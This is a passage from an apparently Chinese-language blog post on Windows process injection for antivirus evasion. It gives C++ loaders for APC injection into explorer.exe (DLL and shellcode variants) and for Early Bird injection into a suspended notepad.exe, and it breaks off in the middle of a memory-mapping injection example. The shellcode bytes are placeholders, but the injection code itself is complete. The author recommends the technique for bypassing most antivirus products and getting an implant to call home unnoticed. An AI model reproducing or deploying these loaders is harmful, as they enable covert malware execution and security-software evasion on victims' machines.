class=&#34;keyword&#34;&gt;sizeof&lt;/span&gt; pe;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;Process32First&lt;/span&gt;(hSnapshot, &amp;amp;pe))&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;do&lt;/span&gt; &amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;lstrcmpi&lt;/span&gt;(lpszProcessName, pe.szExeFile) == &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;)&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hSnapshot);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;                &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; pe.th32ProcessID;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125; &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (&lt;span class=&#34;built_in&#34;&gt;Process32Next&lt;/span&gt;(hSnapshot, &amp;amp;pe));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hSnapshot);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;BOOL &lt;span class=&#34;title&#34;&gt;GetAllThreadIdByProcessId&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;(DWORD dwProcessId)&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DWORD dwBufferLength = &lt;span class=&#34;number&#34;&gt;1000&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    THREADENTRY32 te32 = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hSnapshot = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BOOL bRet = TRUE;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 获取线程快照&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ::&lt;span class=&#34;built_in&#34;&gt;RtlZeroMemory&lt;/span&gt;(&amp;amp;te32, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(te32));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    te32.dwSize = &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(te32);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hSnapshot = ::&lt;span class=&#34;built_in&#34;&gt;CreateToolhelp32Snapshot&lt;/span&gt;(TH32CS_SNAPTHREAD, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;comment&#34;&gt;// 获取第一条线程快照信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    bRet = ::&lt;span class=&#34;built_in&#34;&gt;Thread32First&lt;/span&gt;(hSnapshot, &amp;amp;te32);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;while&lt;/span&gt; (bRet)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 获取进程对应的线程ID&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;keyword&#34;&gt;if&lt;/span&gt; (te32.th32OwnerProcessID == dwProcessId)&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;            &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; te32.th32ThreadID;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        &lt;span class=&#34;comment&#34;&gt;// 遍历下一个线程快照信息&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;        bRet = ::&lt;span class=&#34;built_in&#34;&gt;Thread32Next&lt;/span&gt;(hSnapshot, &amp;amp;te32);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;DllInjdectMain&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;   &lt;span class=&#34;comment&#34;&gt;//dll注入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    FARPROC pLoadLibrary = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hThread = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hProcess = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DWORD Threadid = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DWORD ProcessId = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    BYTE DllName[] = &lt;span class=&#34;string&#34;&gt;&amp;quot;C:\\Users\\Black Sheep\\source\\repos\\ApcInject\\x64\\Debug\\TestDll.dll&amp;quot;&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LPVOID AllocAddr = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ProcessId = &lt;span class=&#34;built_in&#34;&gt;GetProcessIdByName&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;L&amp;quot;explorer.exe&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hProcess = &lt;span class=&#34;built_in&#34;&gt;OpenProcess&lt;/span&gt;(PROCESS_ALL_ACCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, ProcessId);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    pLoadLibrary = &lt;span class=&#34;built_in&#34;&gt;GetProcAddress&lt;/span&gt;(&lt;span class=&#34;built_in&#34;&gt;GetModuleHandle&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;L&amp;quot;kernel32.dll&amp;quot;&lt;/span&gt;), &lt;span class=&#34;string&#34;&gt;&amp;quot;LoadLibraryA&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    AllocAddr = &lt;span class=&#34;built_in&#34;&gt;VirtualAllocEx&lt;/span&gt;(hProcess, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(DllName) + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, MEM_COMMIT, PAGE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;WriteProcessMemory&lt;/span&gt;(hProcess, AllocAddr, DllName, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(DllName) + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Threadid = &lt;span class=&#34;built_in&#34;&gt;GetAllThreadIdByProcessId&lt;/span&gt;(ProcessId);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hThread = &lt;span class=&#34;built_in&#34;&gt;OpenThread&lt;/span&gt;(THREAD_ALL_ACCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, Threadid);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;QueueUserAPC&lt;/span&gt;((PAPCFUNC)pLoadLibrary, hThread, (ULONG_PTR)AllocAddr);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hProcess);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;ShellcodeInjectMain&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt;&lt;/span&gt;&amp;#123;   &lt;span class=&#34;comment&#34;&gt;//shellcode注入&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hThread = &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    HANDLE hProcess = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DWORD Threadid = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    DWORD ProcessId = &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &amp;#123;\x12&amp;#125;; &lt;span class=&#34;comment&#34;&gt;//shellcode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    ProcessId = &lt;span class=&#34;built_in&#34;&gt;GetProcessIdByName&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;L&amp;quot;explorer.exe&amp;quot;&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hProcess = &lt;span class=&#34;built_in&#34;&gt;OpenProcess&lt;/span&gt;(PROCESS_ALL_ACCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, ProcessId);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LPVOID lpBaseeAddresss = (LPVOID)&lt;span class=&#34;built_in&#34;&gt;VirtualAllocEx&lt;/span&gt;(hProcess, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0X1000&lt;/span&gt;, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;WriteProcessMemory&lt;/span&gt;(hProcess, lpBaseeAddresss, shellcode, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode) + &lt;span class=&#34;number&#34;&gt;1&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    Threadid = &lt;span class=&#34;built_in&#34;&gt;GetAllThreadIdByProcessId&lt;/span&gt;(ProcessId);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    hThread = &lt;span class=&#34;built_in&#34;&gt;OpenThread&lt;/span&gt;(THREAD_ALL_ACCESS, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, Threadid);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;QueueUserAPC&lt;/span&gt;((PAPCFUNC)lpBaseeAddresss, hThread, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hProcess);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Early Bird (进阶版 APC 注入)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 先创建一个挂起的白进程并申请一块 RWX 内存用于写入 shellcode，再使用 APC 注入插入线程，再恢复线程。实际上就是在白进程上偷摸注入一个新线程跑 shellcode。&lt;br /&gt;
注入流程跟上述 APC 注入差不多&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt;&lt;span class=&#34;string&#34;&gt;&amp;lt;Windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &amp;#123;&lt;span class=&#34;string&#34;&gt;&amp;quot;\0x1&amp;quot;&lt;/span&gt;&amp;#125;;  &lt;span class=&#34;comment&#34;&gt;//恶意shellcode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    STARTUPINFO si = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    PROCESS_INFORMATION pi = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    si.cb = &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(STARTUPINFO);   &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CreateProcessA&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;C:\\Windows\\System32\\notepad.exe&amp;quot;&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, TRUE, CREATE_SUSPENDED | EMBDHLP_CREATENOW, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, (LPSTARTUPINFOA)&amp;amp;si, &amp;amp;pi);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    LPVOID lpBaseeAddresss = (LPVOID)&lt;span class=&#34;built_in&#34;&gt;VirtualAllocEx&lt;/span&gt;(pi.hProcess, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0X1000&lt;/span&gt;, MEM_RESERVE | MEM_COMMIT, PAGE_EXECUTE_READWRITE);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;WriteProcessMemory&lt;/span&gt;(pi.hProcess, lpBaseeAddresss, (LPVOID)shellcode, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode), &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;QueueUserAPC&lt;/span&gt;((PAPCFUNC)lpBaseeAddresss, pi.hThread, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;ResumeThread&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;built_in&#34;&gt;CloseHandle&lt;/span&gt;(pi.hThread);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;keyword&#34;&gt;return&lt;/span&gt; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&amp;#125;&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;&lt;/figure&gt;&lt;br /&gt;
 这个免杀手法十分的好用，推荐再稍微搭配一下其他规避手段就可以绕过绝大多数杀软做到无感上线，实际代码和上线效果贴在文末。&lt;/p&gt;
&lt;p&gt;&lt;em&gt;&lt;strong&gt;Mapping Injection (内存映射注入)&lt;/strong&gt;&lt;/em&gt;&lt;br /&gt;
 先在物理内存中开辟一段空间用于写入恶意 shellcode，后续利用 MapViewOfFile2 将该恶意内存区域映射到指定进程中的虚拟内存中去，达到 shellcode 注入的效果。&lt;br /&gt;
注入流程：&lt;br /&gt;
1、创建 Mapping 句柄&lt;br /&gt;
 2、将 shellcode 复制到该物理内存地址中去&lt;br /&gt;
 3、将该段物理内存映射到虚拟内存中&lt;br /&gt;
 4、利用任意方法执行到该地址的 shellcode&lt;/p&gt;
&lt;p&gt;&lt;figure class=&#34;highlight cpp&#34;&gt;&lt;table&gt;&lt;tr&gt;&lt;td class=&#34;gutter&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;1&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;2&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;3&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;4&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;5&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;6&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;7&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;8&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;9&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;10&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;11&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;12&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;13&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;14&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;15&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;16&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;17&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;18&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;19&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;20&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;21&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;22&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;23&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;24&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;25&lt;/span&gt;&lt;br&gt;&lt;/pre&gt;&lt;/td&gt;&lt;td class=&#34;code&#34;&gt;&lt;pre&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;windows.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;include&lt;/span&gt; &lt;span class=&#34;string&#34;&gt;&amp;lt;stdio.h&amp;gt;&lt;/span&gt;&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;meta&#34;&gt;#&lt;span class=&#34;keyword&#34;&gt;pragma&lt;/span&gt; comment (lib, &lt;span class=&#34;string&#34;&gt;&amp;quot;OneCore.lib&amp;quot;&lt;/span&gt;)&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;span class=&#34;type&#34;&gt;unsigned&lt;/span&gt; &lt;span class=&#34;type&#34;&gt;char&lt;/span&gt; shellcode[] = &amp;#123;&lt;span class=&#34;number&#34;&gt;0x12&lt;/span&gt;&amp;#125;;  &lt;span class=&#34;comment&#34;&gt;//shellcode&lt;/span&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;    &lt;span class=&#34;function&#34;&gt;&lt;span class=&#34;type&#34;&gt;int&lt;/span&gt; &lt;span class=&#34;title&#34;&gt;main&lt;/span&gt;&lt;span class=&#34;params&#34;&gt;()&lt;/span&gt; &lt;/span&gt;&amp;#123;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     STARTUPINFO si = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     PROCESS_INFORMATION pi = &amp;#123; &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt; &amp;#125;;&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     si.cb = &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(STARTUPINFO);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     HANDLE hMapping = &lt;span class=&#34;built_in&#34;&gt;CreateFileMapping&lt;/span&gt;(INVALID_HANDLE_VALUE, &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;, PAGE_EXECUTE_READWRITE, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode), &lt;span class=&#34;literal&#34;&gt;NULL&lt;/span&gt;);&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     LPVOID lpMapAddress = &lt;span class=&#34;built_in&#34;&gt;MapViewOfFile&lt;/span&gt;(hMapping, FILE_MAP_WRITE, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;number&#34;&gt;0&lt;/span&gt;, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;memcpy&lt;/span&gt;((PVOID)lpMapAddress, shellcode, &lt;span class=&#34;built_in&#34;&gt;sizeof&lt;/span&gt;(shellcode));&lt;/span&gt;&lt;br&gt;&lt;span class=&#34;line&#34;&gt;     &lt;span class=&#34;built_in&#34;&gt;CreateProcessA&lt;/span&gt;(&lt;span class=&#34;string&#34;&gt;&amp;quot;C:\\Windows\\System32\\notepad.exe&amp;quot;&lt;/span&gt;, &lt;span 